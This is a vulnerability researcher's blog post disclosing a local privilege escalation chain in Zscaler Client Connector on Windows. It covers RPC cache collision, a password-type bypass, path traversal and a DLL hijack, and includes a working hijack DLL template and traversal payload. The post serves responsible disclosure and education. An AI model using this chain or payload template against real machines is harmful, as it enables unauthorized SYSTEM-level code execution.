---
source: spaceraccoon
source_url: https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/
title: "Cache Me If You Can: Local Privilege Escalation in Zscaler Client Connector (CVE-2023-41973) | Spaceraccoon's Blog"
published: 2024-05-27T12:01:06+00:00
description: "A couple months ago, my colleague Winston Ho and I chained a series of unfortunate bugs into a zero-interaction local privilege escalation in Zscaler Client Connector. This was an interesting journey into Windows RPC caller validation and bypassing several checks, including Authenticode verification. Check out the original Medium blogpost for Winston’s own ZSATrayManager Arbitrary File Deletion (C"
---

[Get my new book with No Starch Press "From Day Zero to Zero Day: A Hands-On Guide to Vulnerability Research" here! 🚀](https://nostarch.com/zero-day)

# Cache Me If You Can: Local Privilege Escalation in Zscaler Client Connector (CVE-2023-41973)

May 27, 2024
·

1897 words

·

9 minute read


A couple months ago, my colleague Winston Ho and I chained a series of unfortunate bugs into a zero-interaction local privilege escalation in Zscaler Client Connector. This was an interesting journey into Windows RPC caller validation and bypassing several checks, including Authenticode verification. Check out the [original Medium blogpost](https://medium.com/csg-govtech/catch-me-if-you-can-local-privilege-escalation-in-zscaler-client-connector-7ad997bd7058) for Winston’s own ZSATrayManager Arbitrary File Deletion (CVE-2023-41969)!

- Revert password check incorrect type validation (CVE-2023-41972)
- Lack of input santisation on Zscaler Client Connector enables arbitrary code execution (CVE-2023-41973)
- ZSATrayManager Arbitrary File Deletion (CVE-2023-41969)

By chaining together several low-level vulnerabilities and bypasses, we were able to escalate a standard user’s privileges to execute arbitrary commands as the high-privileged **NT AUTHORITY\\SYSTEM** service account on Windows.

In this article, we will share our methodology used, from vulnerability discovery to developing proof-of-concept exploits.

# Overview of Zscaler Client Connector and the Zscaler Ecosystem [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#overview-of-zscaler-client-connector-and-the-zscaler-ecosystem)

Zscaler is an “enterprise cloud security” company that is best known for its VPN and “Zero Trust” network products. The Zscaler Client Connector is a local Desktop client that connects to Zscaler’s various network tunnels.

The ZScaler Client Connector application consists of two main processes: ZSATray and ZSATrayManager. ZSATrayManager is the service that runs as the **NT AUTHORITY\\SYSTEM** user and handles high-privileged actions needed such as network management, configuration enforcement, and updates. ZSATray, on the other hand, is the user-facing frontend application, built on the .NET Framework.

![ZScaler Client Connector](https://spaceraccoon.dev/images/30/zscaler-client-connector.png)

Like most client-server software on Windows, ZSATray and ZSATrayManager communicate using Microsoft Remote Procedure Call (RPC). For example, when a user requests to dump logs from the user interface, ZSATray makes an RPC call to ZSATrayManager using the native sendZSATrayManagerCommand method from _ZSATrayHelper.dll_ with serialised inputs.

```csharp
public bool dumpLogs(ZSATrayManagerConfigDumpLog configData) => this.sendZSATrayManagerCommandHelper(ZSCALER_APP_RPC_COMMAND.DUMP_LOGS, (object) configData) == 0;

private int sendZSATrayManagerCommandHelper(
  ZSCALER_APP_RPC_COMMAND commandCode,
  object configData = null)
  {
    ZSATrayManagerCommand structure = new ZSATrayManagerCommand();
    structure.commandCode = (int) commandCode;
    if (configData != null)
      structure.configJson = JsonConvert.SerializeObject(configData);
    IntPtr num1 = Marshal.AllocCoTaskMem(Marshal.SizeOf((object) structure));
    Marshal.StructureToPtr((object) structure, num1, false);
    int num2 = NativeMethods.sendZSATrayManagerCommand(num1);
    ZSALogger.zsaLog("sendZSATrayManagerCommandHelper retVal: " + num2.ToString());
    Marshal.FreeCoTaskMem(num1);
    return num2;
  }
```

Accepting RPC calls from any process without validation is a significant security risk, especially when some of the RPC calls supported by ZSATrayManager involve the execution of high-privileged actions.

Most software, including ZScaler Client Connector, implements checks to ensure the RPC calls made originate from trusted processes. Thus began our quest to bypass these checks.

# Bypassing the RPC Connection Check via Cache Grooming and Collision [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#bypassing-the-rpc-connection-check-via-cache-grooming-and-collision)

Since _CVE-2020-11635_ ¹, ZScaler Client Connect has added additional validation checks for RPC connections to ZSATrayManager. The checks are executed in the _IfCallbackFn_ function and consists of the following:

1. **Process ID (PID Validation)**: The PID of the caller must match a process whose image path name belongs to an executable that is signed by Zscaler (Authenticode check).
2. **Caller Process Validation**: The caller process must be either:
a. A high-privileged SYSTEM owned process; or
b. _ZSATray.exe_

The ZSATrayManager determines whether the PID belongs to ZSATray by checking a cache in memory. It keys this cache using a Fowler-Noll-Vo hash function (FNV-1a) and stores the process name, allowed status, and last access timestamp.

```fallback
2023--08--05 14:54:53.960564(+0800)[8528:17868] DBG ZSATrayManager: addRpcCallerInCache: --- --- --- --- --- --- entries --- --- --- --- --- --- --- ---
2023--08--05 14:54:53.960564(+0800)[8528:17868] DBG PID | name | is_allowed | last_access_ts
2023--08--05 14:54:53.960564(+0800)[8528:17868] DBG 37352 | C:\Program Files\Zscaler\ZSATray\ZSATray.exe | true | 1691247282094 ms
2023--08--05 14:54:53.960564(+0800)[8528:17868] DBG 39296 | C:\Program Files\Zscaler\ZSATray\ZSATray.exe | true | 1691244684011 ms
2023--08--05 14:54:53.960564(+0800)[8528:17868] DBG 39144 | C:\Program Files\Zscaler\ZSATray\ZSATray.exe | true | 1691246922202 ms
```

When ZSATrayManager first starts ZSATray, it stores its PID in the cache of the ZSATrayManager. In addition, every time ZSATrayManager successfully validates an RPC connection, it stores the hashed PID of the calling process in this cache. In future requests, if the hashed caller PID exists in the cache, it can skip the Authenticode and caller process checks.

Unfortunately, because ZSATrayManager does not regularly prune this cache, it is possible to brute force a cached PID since PIDs are non-random. An attacker can cache numerous allowed PIDs by repeatedly killing the ZSATray process and triggering ZSATrayManager to launch a new ZSATray process that adds a new PID to the cache after making a successful connection to ZSATrayManager. This creates numerous allowed PIDs that the attacker can brute force. By repeatedly starting and killing an exploit binary, the attacker can cause a cache collision when Windows assigns a reused PID that exists in the cache.

The attacker-controlled binary can thus make arbitrary RPC connections to ZSATrayManager that bypasses the validation checks. Since ZSATray already includes an implementation of the RPC connection client in **sendZSATrayManagerCommandHelper**, we can reuse that to make the call from a custom .NET binary for exploitation.

## Process Injection [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#process-injection)

An alternative means to bypass this check is by injecting the user-owned _ZSATray.exe_ process to run arbitrary code. The process will pass all the necessary checks but is somewhat more complex due to ZSATray being a .NET assembly with managed code. The injection can also fail if ZScaler Client Connector’s anti-tampering feature is enabled.

# Exploiting the Revert Password Check Incorrect Type Validation (CVE-2023-41972) [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#exploiting-the-revert-password-check-incorrect-type-validation-cve-2023-41972)

Having achieved the ability to make arbitrary RPC calls to ZSATrayManager, our next step was to explore which supported RPC functions could be exploited to achieve privilege escalation.

Interestingly, ZScaler has added additional authentication for some of these functions, such as _PERFORM\_APP\_REVERT_. As the name suggests, the function reverts ZScaler Client Connector to a previous version by executing an older version’s installer. The function accepts _previousInstallerName_, _pwdType_, and _password_ as arguments. The latter two are used when an administrator has _set a password_ ² for this action and only allow the function to execute if a correct password has been provided.

Unfortunately, ZSATrayManager does not check if _pwdType_ matches _PASSWORD\_TYPE.ZCC\_REVERT\_PWD_ (7), meaning that the password check function will trust whichever _pwdType_ is passed via the RPC and perform the corresponding password check. For example, if _ZIA\_DISABLE\_PWD_ is provided for _pwdType_, ZSATrayManager will check that the _password_ matches the password set for Zscaler Internet Access instead of the password for reverting the application.

```c
case 90: // PERFORM_APP_REVERT
 v66 = sub_1400949C0(v294, (__int64)v371);// Note: there is no check on pwdType e.g. if ( pwdType == 4 ) like in other cases
 if ( (unsigned __int8)PasswordCheck(v67, pwdType, v66, 1) )

Some of the password types including *ZCC_REVERT_PWD* return true by default if no password has been specified.

case 6u:
sub_14025D9B0(a1);
  LOBYTE(isCorrectPassword) = 0;
  if ( passwordConfigured )
  {
    ...
  }
  else
  {
    v8::internal::wasm::ErrorThrower::CompileError(
    (v8::internal::wasm::ErrorThrower *)&LogHandle,
    "Skip password check --- ZAD is not enabled"); // Password check passes since isCorrectPassword is still 0
  }
```

As such, even if a password has been set for **PERFORM\_APP\_REVERT**, an attacker can bypass this by setting _pwdType_ in the RPC to _SHOW\_ADVANCED\_SETTINGS_ (6).

# Exploiting the Lack of Input Santisation on Zscaler Client Connector (CVE-2023-41973) [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#exploiting-the-lack-of-input-santisation-on-zscaler-client-connector-cve-2023-41973)

At this juncture, however, the hallowed **NT AUTHORITY\\SYSTEM** privilege escalation has not been achieved yet. We continued to dig further into **PERFORM\_APP\_REVERT**.

As mentioned earlier, **PERFORM\_APP\_REVERT** accepts a _previousInstallerName_ argument. This argument is appended to _C:\\Program Files\\ZScaler\\RevertZcc_ and is typically set to _{VERSION NUMBER}.exe_. ZSATrayManager executes the file at this path as **NT AUTHORITY\\SYSTEM**. However, since this is controllable from the _previousInstallerName_ parameter, an attacker can send a path traversal string such as _..\\..\\..\\{ATTACKER-CONTROLLED PATH}_ to execute their payload.

Unfortunately for us, there are still additional checks on the executable at the path, such as Microsoft Authenticode signature verification using the \*WinVerifyTrust \*function. This performs an OS-level trust verification to ensure that the executable was properly signed by ZScaler. This verification appears to be done properly as it specifically checks the SHA-2 hash of the signer and issuer thumbprints:

```c
if ( CertCompareIntegerBlob(&v19, (PCRYPT_INTEGER_BLOB)(v6 + 24)) )
  {
    initString(v28, "92c1588e85af2201ce7915e8538b492f605b80c6", 0x28ui64);
    initString(v26, "83fe2a3586d483fd75c0b0abdb89697a56ad0b41", 0x28ui64);
    if ( (unsigned __int8)validateSignerAndIssuerThumbprints(v26, v28, a2) )
    {
      LogInfo(&LogHandle, 1i64, "Signer matches Zscaler SHA2 02/28/2018");
LABEL_20:
      v4 = 1;
    }
  }
```

Here is a snapshot of the log output when we tried to get it to launch Microsoft Word.

```fallback
INF validateSignerAndIssuer Thumbprints returned true
INF Signer matches Zscaler SHA2 March 1, 2021
INF Signer trust released.
INF Process executable is signed by Zscaler.
INF UserSID: "0, 0, 0, 0, 0, 5", SECURITY_LOCAL_SYSTEM_RID: "0, 0, 0, 0, 0, 5"
INF SID matched with SECURITY_LOCAL_SYSTEM_RID
INF ZSAService RPC: Accepting RPC from a SYSTEM owned Zscaler process
INF ZSAService RPC command: PERFORM_APP_REVERT
INF Starting revert
DBG Running zscaler executable: C:\Program Files\Zscaler\RevertZcc\..\..\..\Program Files\Microsoft Office\root\Office16\WINWORD.EXE --- revertzcc 1 --- mode unattended
ERR Signer does not match Zscaler
INF Signer trust released.
ERR Executable [C:\Program Files\Zscaler\RevertZcc\..\..\..\Program Files\Microsoft Office\root\Office16\WINWORD.EXE] is not Zscaler binary.
INF Done with ZSAService RPC command: PERFORM_APP_REVERT with return value:0
```

As such, we needed to find another link in the chain.

# Achieving Arbitrary Code Execution via DLL Hijacking with ZSAService [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#achieving-arbitrary-code-execution-via-dll-hijacking-with-zsaservice)

DLL hijacking is often _not deemed as a vulnerability_ ³ for good reasons, but it can still shine when chained in specific scenarios like this one. Two conditions elevate the humble DLL hijacking to a privilege escalation gadget:

1. The process that is hijacked is executed by a higher-privileged process than the attacker, so a security boundary can be crossed.
2. The DLL hijack path is in a low-privileged attacker-writable location, so no additional privileges are required to execute the attack.

One of the ZScaler Client Connector binaries, ZSAService, is vulnerable to DLL hijacking because its search path starts with the current directory. One of the DLLs that could be hijacked is _userenv.dll_. This is a straightforward DLL hijacking that can be exploited with one of the many DLL hijacking payload templates out there.

```c
#include "pch.h"
#include <iostream>

BOOL APIENTRY DllMain(HMODULE hModule,
  DWORD ul_reason_for_call,
  LPVOID lpReserved
)
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
    system("whoami > C:\\hacked.txt");
    //WinExec("cmd.exe", SW_SHOW);
    //WinExec("powershell.exe", SW_SHOW);
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

extern "C" __declspec(dllexport) void DestroyEnvironmentBlock()
{
  return;
}

extern "C" __declspec(dllexport) void LoadUserProfileW()
{
  return;
}

extern "C" __declspec(dllexport) void UnloadUserProfile()
{
  return;
}

extern "C" __declspec(dllexport) void LoadUserProfileA()
{
  return;
}

extern "C" __declspec(dllexport) void CreateEnvironmentBlock()
{
  return;
}
```

By compiling this as a DLL and placing the DLL (renamed to _userenv.dll_) in the same directory as _ZSAService.exe_, launching _ZSAService.exe_ will cause the arbitrary commands in the malicious _userenv.dll_ to be executed.

Thus, the final link in our chain was complete:

1. Attacker brute forces cached PIDs to make RPC calls to ZSATrayManager.
2. Attacker bypasses password protection for the **PERFORM\_APP\_REVERT** function.
3. Attacker sends path traversal payload in _previousInstallerName_ argument.
4. ZSATrayManager executes DLL-hijacked _ZSAService.exe_ that passes the Authenticode check.
5. Hijack DLL causes the attacker’s commands to be executed as **NT AUTHORITY\\SYSTEM**.
6. Pwned!

# Conclusion [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#conclusion)

This was an extremely fun vulnerability chain that took the greater part of a Friday night, highlighting how multiple small vulnerabilities can add up with enough persistence. One of the biggest challenges in client-server process architectures is authentication and authorisation, making it a ripe hunting ground for vulnerability researchers. Our findings prove that even with proper validation of the calling process, the RPC inputs should be properly sanitised and validated as well.

# Disclosure timeline [🔗](https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/\#disclosure-timeline)

- 15 August 2023: Reported the Password Check bypass and Path Traversal vulnerabilities to the Zscaler team.
- 31 August 2023: Zscaler team acknowledged the findings.
- 28 August 2023: Reported the Arbitrary File Deletion vulnerability to the Zscaler team.
- 01 September 2023: Zscaler Client Connector 4.2.0.209 / 4.3.0.121 was released that fixes **CVE-2023-41972** and **CVE-2023-41973**.
- 11 January 2024: Zscaler team informed the team that CVEs have been reserved.
- 26 March 2024: Zscaler team publicly disclosed the CVEs ( [https://trust.zscaler.com/private.zscaler.com/posts/18226](https://trust.zscaler.com/private.zscaler.com/posts/18226))

\[1\] [https://www.cve.org/CVERecord?id=CVE-2020-11635](https://www.cve.org/CVERecord?id=CVE-2020-11635)

\[2\] [https://help.zscaler.com/client-connector/reverting-zscaler-client-connector](https://help.zscaler.com/client-connector/reverting-zscaler-client-connector)

\[3\] [https://itm4n.github.io/windows-dll-hijacking-clarified/](https://itm4n.github.io/windows-dll-hijacking-clarified/)

\[4\] [https://github.com/googleprojectzero/symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)

\[5\] [https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)

\[6\] [https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities](https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities)

[binary](https://spaceraccoon.dev/tags/binary) [desktop](https://spaceraccoon.dev/tags/desktop) [reverse engineering](https://spaceraccoon.dev/tags/reverse-engineering)